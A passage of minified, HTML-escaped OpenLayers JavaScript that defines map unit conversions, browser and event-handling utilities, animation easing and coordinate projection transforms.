SearsLink:0.2011676512155/OpenLayers.METERS_PER_INCH,Rod:5.02921005842012/OpenLayers.METERS_PER_INCH,IntnlChain:20.1168/OpenLayers.METERS_PER_INCH,IntnlLink:0.201168/OpenLayers.METERS_PER_INCH,Perch:5.02921005842012/OpenLayers.METERS_PER_INCH,Pole:5.02921005842012/OpenLayers.METERS_PER_INCH,Furlong:201.1684023368046/OpenLayers.METERS_PER_INCH,Rood:3.778266898/OpenLayers.METERS_PER_INCH,CapeFoot:0.3047972615/OpenLayers.METERS_PER_INCH,Brealey:375/OpenLayers.METERS_PER_INCH,ModAmFt:0.304812252984506/ OpenLayers.METERS_PER_INCH,Fathom:1.8288/OpenLayers.METERS_PER_INCH,"NautM-UK":1853.184/OpenLayers.METERS_PER_INCH,"50kilometers":5E4/OpenLayers.METERS_PER_INCH,"150kilometers":15E4/OpenLayers.METERS_PER_INCH}); OpenLayers.Util.extend(OpenLayers.INCHES_PER_UNIT,{mm:OpenLayers.INCHES_PER_UNIT.Meter/1E3,cm:OpenLayers.INCHES_PER_UNIT.Meter/100,dm:100*OpenLayers.INCHES_PER_UNIT.Meter,km:1E3*OpenLayers.INCHES_PER_UNIT.Meter,kmi:OpenLayers.INCHES_PER_UNIT.nmi,fath:OpenLayers.INCHES_PER_UNIT.Fathom,ch:OpenLayers.INCHES_PER_UNIT.IntnlChain,link:OpenLayers.INCHES_PER_UNIT.IntnlLink,"us-in":OpenLayers.INCHES_PER_UNIT.inches,"us-ft":OpenLayers.INCHES_PER_UNIT.Foot,"us-yd":OpenLayers.INCHES_PER_UNIT.Yard,"us-ch":OpenLayers.INCHES_PER_UNIT.GunterChain, "us-mi":OpenLayers.INCHES_PER_UNIT.Mile,"ind-yd":OpenLayers.INCHES_PER_UNIT.IndianYd37,"ind-ft":OpenLayers.INCHES_PER_UNIT.IndianFt37,"ind-ch":20.11669506/OpenLayers.METERS_PER_INCH});OpenLayers.DOTS_PER_INCH=72;OpenLayers.Util.normalizeScale=function(a){return 1&lt;a?1/a:a};OpenLayers.Util.getResolutionFromScale=function(a,b){var c;a&amp;&amp;(null==b&amp;&amp;(b="degrees"),c=1/(OpenLayers.Util.normalizeScale(a)*OpenLayers.INCHES_PER_UNIT[b]*OpenLayers.DOTS_PER_INCH));return c}; OpenLayers.Util.getScaleFromResolution=function(a,b){null==b&amp;&amp;(b="degrees");return a*OpenLayers.INCHES_PER_UNIT[b]*OpenLayers.DOTS_PER_INCH}; OpenLayers.Util.pagePosition=function(a){var b=[0,0],c=OpenLayers.Util.getViewportElement();if(!a||a==window||a==c)return b;var d=OpenLayers.IS_GECKO&amp;&amp;document.getBoxObjectFor&amp;&amp;"absolute"==OpenLayers.Element.getStyle(a,"position")&amp;&amp;(""==a.style.top||""==a.style.left),e=null;if(a.getBoundingClientRect)a=a.getBoundingClientRect(),e=window.pageYOffset||c.scrollTop,b[0]=a.left+(window.pageXOffset||c.scrollLeft),b[1]=a.top+e;else if(document.getBoxObjectFor&amp;&amp;!d)a=document.getBoxObjectFor(a),c=document.getBoxObjectFor(c), b[0]=a.screenX-c.screenX,b[1]=a.screenY-c.screenY;else{b[0]=a.offsetLeft;b[1]=a.offsetTop;e=a.offsetParent;if(e!=a)for(;e;)b[0]+=e.offsetLeft,b[1]+=e.offsetTop,e=e.offsetParent;c=OpenLayers.BROWSER_NAME;if("opera"==c||"safari"==c&amp;&amp;"absolute"==OpenLayers.Element.getStyle(a,"position"))b[1]-=document.body.offsetTop;for(e=a.offsetParent;e&amp;&amp;e!=document.body;){b[0]-=e.scrollLeft;if("opera"!=c||"TR"!=e.tagName)b[1]-=e.scrollTop;e=e.offsetParent}}return b}; OpenLayers.Util.getViewportElement=function(){var a=arguments.callee.viewportElement;void 0==a&amp;&amp;(a="msie"==OpenLayers.BROWSER_NAME&amp;&amp;"CSS1Compat"!=document.compatMode?document.body:document.documentElement,arguments.callee.viewportElement=a);return a}; OpenLayers.Util.isEquivalentUrl=function(a,b,c){c=c||{};OpenLayers.Util.applyDefaults(c,{ignoreCase:!0,ignorePort80:!0,ignoreHash:!0,splitArgs:!1});a=OpenLayers.Util.createUrlObject(a,c);b=OpenLayers.Util.createUrlObject(b,c);for(var d in a)if("args"!==d&amp;&amp;a[d]!=b[d])return!1;for(d in a.args){if(a.args[d]!=b.args[d])return!1;delete b.args[d]}for(d in b.args)return!1;return!0}; OpenLayers.Util.createUrlObject=function(a,b){b=b||{};if(!/^\w+:\/\//.test(a)){var c=window.location,d=c.port?":"+c.port:"",d=c.protocol+"//"+c.host.split(":").shift()+d;0===a.indexOf("/")?a=d+a:(c=c.pathname.split("/"),c.pop(),a=d+c.join("/")+"/"+a)}b.ignoreCase&amp;&amp;(a=a.toLowerCase());c=document.createElement("a");c.href=a;d={};d.host=c.host.split(":").shift();d.protocol=c.protocol;d.port=b.ignorePort80?"80"==c.port||"0"==c.port?"":c.port:""==c.port||"0"==c.port?"80":c.port;d.hash=b.ignoreHash||"#"=== c.hash?"":c.hash;var e=c.search;e||(e=a.indexOf("?"),e=-1!=e?a.substr(e):"");d.args=OpenLayers.Util.getParameters(e,{splitArgs:b.splitArgs});d.pathname="/"==c.pathname.charAt(0)?c.pathname:"/"+c.pathname;return d};OpenLayers.Util.removeTail=function(a){var b=null,b=a.indexOf("?"),c=a.indexOf("#");return b=-1==b?-1!=c?a.substr(0,c):a:-1!=c?a.substr(0,Math.min(b,c)):a.substr(0,b)};OpenLayers.IS_GECKO=function(){var a=navigator.userAgent.toLowerCase();return-1==a.indexOf("webkit")&amp;&amp;-1!=a.indexOf("gecko")}(); OpenLayers.CANVAS_SUPPORTED=function(){var a=document.createElement("canvas");return!(!a.getContext||!a.getContext("2d"))}();OpenLayers.BROWSER_NAME=function(){var a="",b=navigator.userAgent.toLowerCase();-1!=b.indexOf("opera")?a="opera":-1!=b.indexOf("msie")?a="msie":-1!=b.indexOf("safari")?a="safari":-1!=b.indexOf("mozilla")&amp;&amp;(a=-1!=b.indexOf("firefox")?"firefox":"mozilla");return a}();OpenLayers.Util.getBrowserName=function(){return OpenLayers.BROWSER_NAME}; OpenLayers.Util.getRenderedDimensions=function(a,b,c){var d,e,f=document.createElement("div");f.style.visibility="hidden";for(var g=c&amp;&amp;c.containerElement?c.containerElement:document.body,h=!1,k=null,l=g;l&amp;&amp;"body"!=l.tagName.toLowerCase();){var m=OpenLayers.Element.getStyle(l,"position");if("absolute"==m){h=!0;break}else if(m&amp;&amp;"static"!=m)break;l=l.parentNode}!h||0!==g.clientHeight&amp;&amp;0!==g.clientWidth||(k=document.createElement("div"),k.style.visibility="hidden",k.style.position="absolute",k.style.overflow= "visible",k.style.width=document.body.clientWidth+"px",k.style.height=document.body.clientHeight+"px",k.appendChild(f));f.style.position="absolute";b&amp;&amp;(b.w?(d=b.w,f.style.width=d+"px"):b.h&amp;&amp;(e=b.h,f.style.height=e+"px"));c&amp;&amp;c.displayClass&amp;&amp;(f.className=c.displayClass);b=document.createElement("div");b.innerHTML=a;b.style.overflow="visible";if(b.childNodes)for(a=0,c=b.childNodes.length;a&lt;c;a++)b.childNodes[a].style&amp;&amp;(b.childNodes[a].style.overflow="visible");f.appendChild(b);k?g.appendChild(k):g.appendChild(f); d||(d=parseInt(b.scrollWidth),f.style.width=d+"px");e||(e=parseInt(b.scrollHeight));f.removeChild(b);k?(k.removeChild(f),g.removeChild(k)):g.removeChild(f);return new OpenLayers.Size(d,e)}; OpenLayers.Util.getScrollbarWidth=function(){var a=OpenLayers.Util._scrollbarWidth;if(null==a){var b=null,c=null,b=a=0,b=document.createElement("div");b.style.position="absolute";b.style.top="-1000px";b.style.left="-1000px";b.style.width="100px";b.style.height="50px";b.style.overflow="hidden";c=document.createElement("div");c.style.width="100%";c.style.height="200px";b.appendChild(c);document.body.appendChild(b);a=c.offsetWidth;b.style.overflow="scroll";b=c.offsetWidth;document.body.removeChild(document.body.lastChild); OpenLayers.Util._scrollbarWidth=a-b;a=OpenLayers.Util._scrollbarWidth}return a}; OpenLayers.Util.getFormattedLonLat=function(a,b,c){c||(c="dms");a=(a+540)%360-180;var d=Math.abs(a),e=Math.floor(d),f=d=(d-e)/(1/60),d=Math.floor(d),f=Math.round(10*((f-d)/(1/60))),f=f/10;60&lt;=f&amp;&amp;(f-=60,d+=1,60&lt;=d&amp;&amp;(d-=60,e+=1));10>e&amp;&amp;(e="0"+e);e+="\u00b0";0&lt;=c.indexOf("dm")&amp;&amp;(10>d&amp;&amp;(d="0"+d),e+=d+"'",0&lt;=c.indexOf("dms")&amp;&amp;(10>f&amp;&amp;(f="0"+f),e+=f+'"'));return e="lon"==b?e+(0>a?OpenLayers.i18n("W"):OpenLayers.i18n("E")):e+(0>a?OpenLayers.i18n("S"):OpenLayers.i18n("N"))};OpenLayers.Format=OpenLayers.Class({options:null,externalProjection:null,internalProjection:null,data:null,keepData:!1,initialize:function(a){OpenLayers.Util.extend(this,a);this.options=a},destroy:function(){},read:function(a){throw Error("Read not implemented.");},write:function(a){throw Error("Write not implemented.");},CLASS_NAME:"OpenLayers.Format"});OpenLayers.Format.CSWGetRecords=function(a){a=OpenLayers.Util.applyDefaults(a,OpenLayers.Format.CSWGetRecords.DEFAULTS);var b=OpenLayers.Format.CSWGetRecords["v"+a.version.replace(/\./g,"_")];if(!b)throw"Unsupported CSWGetRecords version: "+a.version;return new b(a)};OpenLayers.Format.CSWGetRecords.DEFAULTS={version:"2.0.2"};OpenLayers.Control=OpenLayers.Class({id:null,map:null,div:null,type:null,allowSelection:!1,displayClass:"",title:"",autoActivate:!1,active:null,handlerOptions:null,handler:null,eventListeners:null,events:null,initialize:function(a){this.displayClass=this.CLASS_NAME.replace("OpenLayers.","ol").replace(/\./g,"");OpenLayers.Util.extend(this,a);this.events=new OpenLayers.Events(this);if(this.eventListeners instanceof Object)this.events.on(this.eventListeners);null==this.id&amp;&amp;(this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+ "_"))},destroy:function(){this.events&amp;&amp;(this.eventListeners&amp;&amp;this.events.un(this.eventListeners),this.events.destroy(),this.events=null);this.eventListeners=null;this.handler&amp;&amp;(this.handler.destroy(),this.handler=null);if(this.handlers){for(var a in this.handlers)this.handlers.hasOwnProperty(a)&amp;&amp;"function"==typeof this.handlers[a].destroy&amp;&amp;this.handlers[a].destroy();this.handlers=null}this.map&amp;&amp;(this.map.removeControl(this),this.map=null);this.div=null},setMap:function(a){this.map=a;this.handler&amp;&amp; this.handler.setMap(a)},draw:function(a){null==this.div&amp;&amp;(this.div=OpenLayers.Util.createDiv(this.id),this.div.className=this.displayClass,this.allowSelection||(this.div.className+=" olControlNoSelect",this.div.setAttribute("unselectable","on",0),this.div.onselectstart=OpenLayers.Function.False),""!=this.title&amp;&amp;(this.div.title=this.title));null!=a&amp;&amp;(this.position=a.clone());this.moveTo(this.position);return this.div},moveTo:function(a){null!=a&amp;&amp;null!=this.div&amp;&amp;(this.div.style.left=a.x+"px",this.div.style.top= a.y+"px")},activate:function(){if(this.active)return!1;this.handler&amp;&amp;this.handler.activate();this.active=!0;this.map&amp;&amp;OpenLayers.Element.addClass(this.map.viewPortDiv,this.displayClass.replace(/ /g,"")+"Active");this.events.triggerEvent("activate");return!0},deactivate:function(){return this.active?(this.handler&amp;&amp;this.handler.deactivate(),this.active=!1,this.map&amp;&amp;OpenLayers.Element.removeClass(this.map.viewPortDiv,this.displayClass.replace(/ /g,"")+"Active"),this.events.triggerEvent("deactivate"), !0):!1},CLASS_NAME:"OpenLayers.Control"});OpenLayers.Control.TYPE_BUTTON=1;OpenLayers.Control.TYPE_TOGGLE=2;OpenLayers.Control.TYPE_TOOL=3;OpenLayers.Event={observers:!1,KEY_SPACE:32,KEY_BACKSPACE:8,KEY_TAB:9,KEY_RETURN:13,KEY_ESC:27,KEY_LEFT:37,KEY_UP:38,KEY_RIGHT:39,KEY_DOWN:40,KEY_DELETE:46,element:function(a){return a.target||a.srcElement},isSingleTouch:function(a){return a.touches&amp;&amp;1==a.touches.length},isMultiTouch:function(a){return a.touches&amp;&amp;1&lt;a.touches.length},isLeftClick:function(a){return a.which&amp;&amp;1==a.which||a.button&amp;&amp;1==a.button},isRightClick:function(a){return a.which&amp;&amp;3==a.which||a.button&amp;&amp;2==a.button},stop:function(a, b){b||OpenLayers.Event.preventDefault(a);a.stopPropagation?a.stopPropagation():a.cancelBubble=!0},preventDefault:function(a){a.preventDefault?a.preventDefault():a.returnValue=!1},findElement:function(a,b){for(var c=OpenLayers.Event.element(a);c.parentNode&amp;&amp;(!c.tagName||c.tagName.toUpperCase()!=b.toUpperCase());)c=c.parentNode;return c},observe:function(a,b,c,d){a=OpenLayers.Util.getElement(a);d=d||!1;"keypress"==b&amp;&amp;(navigator.appVersion.match(/Konqueror|Safari|KHTML/)||a.attachEvent)&amp;&amp;(b="keydown"); this.observers||(this.observers={});if(!a._eventCacheID){var e="eventCacheID_";a.id&amp;&amp;(e=a.id+"_"+e);a._eventCacheID=OpenLayers.Util.createUniqueID(e)}e=a._eventCacheID;this.observers[e]||(this.observers[e]=[]);this.observers[e].push({element:a,name:b,observer:c,useCapture:d});a.addEventListener?a.addEventListener(b,c,d):a.attachEvent&amp;&amp;a.attachEvent("on"+b,c)},stopObservingElement:function(a){a=OpenLayers.Util.getElement(a)._eventCacheID;this._removeElementObservers(OpenLayers.Event.observers[a])}, _removeElementObservers:function(a){if(a)for(var b=a.length-1;0&lt;=b;b--){var c=a[b];OpenLayers.Event.stopObserving.apply(this,[c.element,c.name,c.observer,c.useCapture])}},stopObserving:function(a,b,c,d){d=d||!1;a=OpenLayers.Util.getElement(a);var e=a._eventCacheID;"keypress"==b&amp;&amp;(navigator.appVersion.match(/Konqueror|Safari|KHTML/)||a.detachEvent)&amp;&amp;(b="keydown");var f=!1,g=OpenLayers.Event.observers[e];if(g)for(var h=0;!f&amp;&amp;h&lt;g.length;){var k=g[h];if(k.name==b&amp;&amp;k.observer==c&amp;&amp;k.useCapture==d){g.splice(h, 1);0==g.length&amp;&amp;delete OpenLayers.Event.observers[e];f=!0;break}h++}f&amp;&amp;(a.removeEventListener?a.removeEventListener(b,c,d):a&amp;&amp;a.detachEvent&amp;&amp;a.detachEvent("on"+b,c));return f},unloadCache:function(){if(OpenLayers.Event&amp;&amp;OpenLayers.Event.observers){for(var a in OpenLayers.Event.observers)OpenLayers.Event._removeElementObservers.apply(this,[OpenLayers.Event.observers[a]]);OpenLayers.Event.observers=!1}},CLASS_NAME:"OpenLayers.Event"}; OpenLayers.Event.observe(window,"unload",OpenLayers.Event.unloadCache,!1); OpenLayers.Events=OpenLayers.Class({BROWSER_EVENTS:"mouseover mouseout mousedown mouseup mousemove click dblclick rightclick dblrightclick resize focus blur touchstart touchmove touchend keydown".split(" "),listeners:null,object:null,element:null,eventHandler:null,fallThrough:null,includeXY:!1,extensions:null,extensionCount:null,clearMouseListener:null,initialize:function(a,b,c,d,e){OpenLayers.Util.extend(this,e);this.object=a;this.fallThrough=d;this.listeners={};this.extensions={};this.extensionCount= {};this._msTouches=[];null!=b&amp;&amp;this.attachToElement(b)},destroy:function(){for(var a in this.extensions)"boolean"!==typeof this.extensions[a]&amp;&amp;this.extensions[a].destroy();this.extensions=null;this.element&amp;&amp;(OpenLayers.Event.stopObservingElement(this.element),this.element.hasScrollEvent&amp;&amp;OpenLayers.Event.stopObserving(window,"scroll",this.clearMouseListener));this.eventHandler=this.fallThrough=this.object=this.listeners=this.element=null},addEventType:function(a){},attachToElement:function(a){this.element? OpenLayers.Event.stopObservingElement(this.element):(this.eventHandler=OpenLayers.Function.bindAsEventListener(this.handleBrowserEvent,this),this.clearMouseListener=OpenLayers.Function.bind(this.clearMouseCache,this));this.element=a;for(var b=!!window.navigator.msMaxTouchPoints,c,d=0,e=this.BROWSER_EVENTS.length;d&lt;e;d++)c=this.BROWSER_EVENTS[d],OpenLayers.Event.observe(a,c,this.eventHandler),b&amp;&amp;0===c.indexOf("touch")&amp;&amp;this.addMsTouchListener(a,c,this.eventHandler);OpenLayers.Event.observe(a,"dragstart", OpenLayers.Event.stop)},on:function(a){for(var b in a)"scope"!=b&amp;&amp;a.hasOwnProperty(b)&amp;&amp;this.register(b,a.scope,a[b])},register:function(a,b,c,d){a in OpenLayers.Events&amp;&amp;!this.extensions[a]&amp;&amp;(this.extensions[a]=new OpenLayers.Events[a](this));if(null!=c){null==b&amp;&amp;(b=this.object);var e=this.listeners[a];e||(e=[],this.listeners[a]=e,this.extensionCount[a]=0);b={obj:b,func:c};d?(e.splice(this.extensionCount[a],0,b),"object"===typeof d&amp;&amp;d.extension&amp;&amp;this.extensionCount[a]++):e.push(b)}},registerPriority:function(a, b,c){this.register(a,b,c,!0)},un:function(a){for(var b in a)"scope"!=b&amp;&amp;a.hasOwnProperty(b)&amp;&amp;this.unregister(b,a.scope,a[b])},unregister:function(a,b,c){null==b&amp;&amp;(b=this.object);a=this.listeners[a];if(null!=a)for(var d=0,e=a.length;d&lt;e;d++)if(a[d].obj==b&amp;&amp;a[d].func==c){a.splice(d,1);break}},remove:function(a){null!=this.listeners[a]&amp;&amp;(this.listeners[a]=[])},triggerEvent:function(a,b){var c=this.listeners[a];if(c&amp;&amp;0!=c.length){null==b&amp;&amp;(b={});b.object=this.object;b.element=this.element;b.type||(b.type= a);for(var c=c.slice(),d,e=0,f=c.length;e&lt;f&amp;&amp;(d=c[e],d=d.func.apply(d.obj,[b]),void 0==d||!1!=d);e++);this.fallThrough||OpenLayers.Event.stop(b,!0);return d}},handleBrowserEvent:function(a){var b=a.type,c=this.listeners[b];if(c&amp;&amp;0!=c.length){if((c=a.touches)&amp;&amp;c[0]){for(var d=0,e=0,f=c.length,g,h=0;h&lt;f;++h)g=this.getTouchClientXY(c[h]),d+=g.clientX,e+=g.clientY;a.clientX=d/f;a.clientY=e/f}this.includeXY&amp;&amp;(a.xy=this.getMousePosition(a));this.triggerEvent(b,a)}},getTouchClientXY:function(a){var b=window.olMockWin|| window,c=b.pageXOffset,b=b.pageYOffset,d=a.clientX,e=a.clientY;if(0===a.pageY&amp;&amp;Math.floor(e)>Math.floor(a.pageY)||0===a.pageX&amp;&amp;Math.floor(d)>Math.floor(a.pageX))d-=c,e-=b;else if(e&lt;a.pageY-b||d&lt;a.pageX-c)d=a.pageX-c,e=a.pageY-b;a.olClientX=d;a.olClientY=e;return{clientX:d,clientY:e}},clearMouseCache:function(){this.element.scrolls=null;this.element.lefttop=null;this.element.offsets=null},getMousePosition:function(a){this.includeXY?this.element.hasScrollEvent||(OpenLayers.Event.observe(window,"scroll", this.clearMouseListener),this.element.hasScrollEvent=!0):this.clearMouseCache();if(!this.element.scrolls){var b=OpenLayers.Util.getViewportElement();this.element.scrolls=[window.pageXOffset||b.scrollLeft,window.pageYOffset||b.scrollTop]}this.element.lefttop||(this.element.lefttop=[document.documentElement.clientLeft||0,document.documentElement.clientTop||0]);this.element.offsets||(this.element.offsets=OpenLayers.Util.pagePosition(this.element));return new OpenLayers.Pixel(a.clientX+this.element.scrolls[0]- this.element.offsets[0]-this.element.lefttop[0],a.clientY+this.element.scrolls[1]-this.element.offsets[1]-this.element.lefttop[1])},addMsTouchListener:function(a,b,c){function d(a){c(OpenLayers.Util.applyDefaults({stopPropagation:function(){for(var a=e.length-1;0&lt;=a;--a)e[a].stopPropagation()},preventDefault:function(){for(var a=e.length-1;0&lt;=a;--a)e[a].preventDefault()},type:b},a))}var e=this._msTouches;switch(b){case "touchstart":return this.addMsTouchListenerStart(a,b,d);case "touchend":return this.addMsTouchListenerEnd(a, b,d);case "touchmove":return this.addMsTouchListenerMove(a,b,d);default:throw"Unknown touch event type";}},addMsTouchListenerStart:function(a,b,c){var d=this._msTouches;OpenLayers.Event.observe(a,"MSPointerDown",function(a){for(var b=!1,g=0,h=d.length;g&lt;h;++g)if(d[g].pointerId==a.pointerId){b=!0;break}b||d.push(a);a.touches=d.slice();c(a)});OpenLayers.Event.observe(a,"MSPointerUp",function(a){for(var b=0,c=d.length;b&lt;c;++b)if(d[b].pointerId==a.pointerId){d.splice(b,1);break}})},addMsTouchListenerMove:function(a, b,c){var d=this._msTouches;OpenLayers.Event.observe(a,"MSPointerMove",function(a){if(a.pointerType!=a.MSPOINTER_TYPE_MOUSE||0!=a.buttons)if(1!=d.length||d[0].pageX!=a.pageX||d[0].pageY!=a.pageY){for(var b=0,g=d.length;b&lt;g;++b)if(d[b].pointerId==a.pointerId){d[b]=a;break}a.touches=d.slice();c(a)}})},addMsTouchListenerEnd:function(a,b,c){var d=this._msTouches;OpenLayers.Event.observe(a,"MSPointerUp",function(a){for(var b=0,g=d.length;b&lt;g;++b)if(d[b].pointerId==a.pointerId){d.splice(b,1);break}a.touches= d.slice();c(a)})},CLASS_NAME:"OpenLayers.Events"});OpenLayers.Events.buttonclick=OpenLayers.Class({target:null,events:"mousedown mouseup click dblclick touchstart touchmove touchend keydown".split(" "),startRegEx:/^mousedown|touchstart$/,cancelRegEx:/^touchmove$/,completeRegEx:/^mouseup|touchend$/,initialize:function(a){this.target=a;for(a=this.events.length-1;0&lt;=a;--a)this.target.register(this.events[a],this,this.buttonClick,{extension:!0})},destroy:function(){for(var a=this.events.length-1;0&lt;=a;--a)this.target.unregister(this.events[a],this,this.buttonClick); delete this.target},getPressedButton:function(a){var b=3,c;do{if(OpenLayers.Element.hasClass(a,"olButton")){c=a;break}a=a.parentNode}while(0&lt;--b&amp;&amp;a);return c},ignore:function(a){var b=3,c=!1;do{if("a"===a.nodeName.toLowerCase()){c=!0;break}a=a.parentNode}while(0&lt;--b&amp;&amp;a);return c},buttonClick:function(a){var b=!0,c=OpenLayers.Event.element(a);if(c&amp;&amp;(OpenLayers.Event.isLeftClick(a)||!~a.type.indexOf("mouse")))if(c=this.getPressedButton(c)){if("keydown"===a.type)switch(a.keyCode){case OpenLayers.Event.KEY_RETURN:case OpenLayers.Event.KEY_SPACE:this.target.triggerEvent("buttonclick", {buttonElement:c}),OpenLayers.Event.stop(a),b=!1}else if(this.startEvt){if(this.completeRegEx.test(a.type)){var b=OpenLayers.Util.pagePosition(c),d=OpenLayers.Util.getViewportElement(),e=window.pageYOffset||d.scrollTop;b[0]-=window.pageXOffset||d.scrollLeft;b[1]-=e;this.target.triggerEvent("buttonclick",{buttonElement:c,buttonXY:{x:this.startEvt.clientX-b[0],y:this.startEvt.clientY-b[1]}})}this.cancelRegEx.test(a.type)&amp;&amp;delete this.startEvt;OpenLayers.Event.stop(a);b=!1}this.startRegEx.test(a.type)&amp;&amp; (this.startEvt=a,OpenLayers.Event.stop(a),b=!1)}else b=!this.ignore(OpenLayers.Event.element(a)),delete this.startEvt;return b}});OpenLayers.Util=OpenLayers.Util||{}; OpenLayers.Util.vendorPrefix=function(){function a(a){return a?a.replace(/([A-Z])/g,function(a){return"-"+a.toLowerCase()}).replace(/^ms-/,"-ms-"):null}function b(a,b){if(void 0===g[b]){var c,e=0,f=d.length,p="undefined"!==typeof a.cssText;for(g[b]=null;e&lt;f;e++)if((c=d[e])?(p||(c=c.toLowerCase()),c=c+b.charAt(0).toUpperCase()+b.slice(1)):c=b,void 0!==a[c]){g[b]=c;break}}return g[b]}function c(a){return b(e,a)}var d=["","O","ms","Moz","Webkit"],e=document.createElement("div").style,f={},g={};return{css:function(b){if(void 0=== f[b]){var d=b.replace(/(-[\s\S])/g,function(a){return a.charAt(1).toUpperCase()}),d=c(d);f[b]=a(d)}return f[b]},js:b,style:c,cssCache:f,jsCache:g}}();OpenLayers.Animation=function(a){var b=OpenLayers.Util.vendorPrefix.js(a,"requestAnimationFrame"),c=!!b,d=function(){var c=a[b]||function(b,c){a.setTimeout(b,16)};return function(b,d){c.apply(a,[b,d])}}(),e=0,f={};return{isNative:c,requestFrame:d,start:function(a,b,c){b=0&lt;b?b:Number.POSITIVE_INFINITY;var l=++e,m=+new Date;f[l]=function(){f[l]&amp;&amp;+new Date-m&lt;=b?(a(),f[l]&amp;&amp;d(f[l],c)):delete f[l]};d(f[l],c);return l},stop:function(a){delete f[a]}}}(window);OpenLayers.Tween=OpenLayers.Class({easing:null,begin:null,finish:null,duration:null,callbacks:null,time:null,minFrameRate:null,startTime:null,animationId:null,playing:!1,initialize:function(a){this.easing=a?a:OpenLayers.Easing.Expo.easeOut},start:function(a,b,c,d){this.playing=!0;this.begin=a;this.finish=b;this.duration=c;this.callbacks=d.callbacks;this.minFrameRate=d.minFrameRate||30;this.time=0;this.startTime=(new Date).getTime();OpenLayers.Animation.stop(this.animationId);this.animationId=null; this.callbacks&amp;&amp;this.callbacks.start&amp;&amp;this.callbacks.start.call(this,this.begin);this.animationId=OpenLayers.Animation.start(OpenLayers.Function.bind(this.play,this))},stop:function(){this.playing&amp;&amp;(this.callbacks&amp;&amp;this.callbacks.done&amp;&amp;this.callbacks.done.call(this,this.finish),OpenLayers.Animation.stop(this.animationId),this.animationId=null,this.playing=!1)},play:function(){var a={},b;for(b in this.begin){var c=this.begin[b],d=this.finish[b];if(null==c||null==d||isNaN(c)||isNaN(d))throw new TypeError("invalid value for Tween"); a[b]=this.easing.apply(this,[this.time,c,d-c,this.duration])}this.time++;this.callbacks&amp;&amp;this.callbacks.eachStep&amp;&amp;((new Date).getTime()-this.startTime)/this.time&lt;=1E3/this.minFrameRate&amp;&amp;this.callbacks.eachStep.call(this,a);this.time>this.duration&amp;&amp;this.stop()},CLASS_NAME:"OpenLayers.Tween"});OpenLayers.Easing={CLASS_NAME:"OpenLayers.Easing"};OpenLayers.Easing.Linear={easeIn:function(a,b,c,d){return c*a/d+b},easeOut:function(a,b,c,d){return c*a/d+b},easeInOut:function(a,b,c,d){return c*a/d+b},CLASS_NAME:"OpenLayers.Easing.Linear"}; OpenLayers.Easing.Expo={easeIn:function(a,b,c,d){return 0==a?b:c*Math.pow(2,10*(a/d-1))+b},easeOut:function(a,b,c,d){return a==d?b+c:c*(-Math.pow(2,-10*a/d)+1)+b},easeInOut:function(a,b,c,d){return 0==a?b:a==d?b+c:1>(a/=d/2)?c/2*Math.pow(2,10*(a-1))+b:c/2*(-Math.pow(2,-10*--a)+2)+b},CLASS_NAME:"OpenLayers.Easing.Expo"}; OpenLayers.Easing.Quad={easeIn:function(a,b,c,d){return c*(a/=d)*a+b},easeOut:function(a,b,c,d){return-c*(a/=d)*(a-2)+b},easeInOut:function(a,b,c,d){return 1>(a/=d/2)?c/2*a*a+b:-c/2*(--a*(a-2)-1)+b},CLASS_NAME:"OpenLayers.Easing.Quad"};OpenLayers.Projection=OpenLayers.Class({proj:null,projCode:null,titleRegEx:/\+title=[^\+]*/,initialize:function(a,b){OpenLayers.Util.extend(this,b);this.projCode=a;"object"==typeof Proj4js&amp;&amp;(this.proj=new Proj4js.Proj(a))},getCode:function(){return this.proj?this.proj.srsCode:this.projCode},getUnits:function(){return this.proj?this.proj.units:null},toString:function(){return this.getCode()},equals:function(a){var b=!1;a&amp;&amp;(a instanceof OpenLayers.Projection||(a=new OpenLayers.Projection(a)),"object"== typeof Proj4js&amp;&amp;this.proj.defData&amp;&amp;a.proj.defData?b=this.proj.defData.replace(this.titleRegEx,"")==a.proj.defData.replace(this.titleRegEx,""):a.getCode&amp;&amp;(b=this.getCode(),a=a.getCode(),b=b==a||!!OpenLayers.Projection.transforms[b]&amp;&amp;OpenLayers.Projection.transforms[b][a]===OpenLayers.Projection.nullTransform));return b},destroy:function(){delete this.proj;delete this.projCode},CLASS_NAME:"OpenLayers.Projection"});OpenLayers.Projection.transforms={}; OpenLayers.Projection.defaults={"EPSG:4326":{units:"degrees",maxExtent:[-180,-90,180,90],yx:!0},"CRS:84":{units:"degrees",maxExtent:[-180,-90,180,90]},"EPSG:900913":{units:"m",maxExtent:[-2.003750834E7,-2.003750834E7,2.003750834E7,2.003750834E7]}}; OpenLayers.Projection.addTransform=function(a,b,c){if(c===OpenLayers.Projection.nullTransform){var d=OpenLayers.Projection.defaults[a];d&amp;&amp;!OpenLayers.Projection.defaults[b]&amp;&amp;(OpenLayers.Projection.defaults[b]=d)}OpenLayers.Projection.transforms[a]||(OpenLayers.Projection.transforms[a]={});OpenLayers.Projection.transforms[a][b]=c}; OpenLayers.Projection.transform=function(a,b,c){if(b&amp;&amp;c)if(b instanceof OpenLayers.Projection||(b=new OpenLayers.Projection(b)),c instanceof OpenLayers.Projection||(c=new OpenLayers.Projection(c)),b.proj&amp;&amp;c.proj)a=Proj4js.transform(b.proj,c.proj,a);else{b=b.getCode();c=c.getCode();var d=OpenLayers.Projection.transforms;if(d[b]&amp;&amp;d[b][c])d[b][c](a)}return a};OpenLayers.Projection.nullTransform=function(a){return a}; (function(){function a(a){a.x=180*a.x/d;a.y=180/Math.PI*(2*Math.atan(Math.exp(a.y/d*Math.PI))-Math.PI/2);return a}function b(a){a.x=a.x*d/180;var b=Math.log(Math.tan((90+a.y)*Math.PI/360))/Math.PI*d;a.y=Math.max(-2.003750834E7,Math.min(b,2.003750834E7));return a}function c(c,d){var e=OpenLayers.Projection.addTransform,f=OpenLayers.Projection.nullTransform,g,p,q,r,s;g=0;for(p=d.length;g&lt;p;++g)for(q=d[g],e(c,q,b),e(q,c,a),s=g+1;s&lt;p;++s)r=d[s],e(q,r,f),e(r,q,f)}var d=2.003750834E7,e=["EPSG:900913","EPSG:3857", 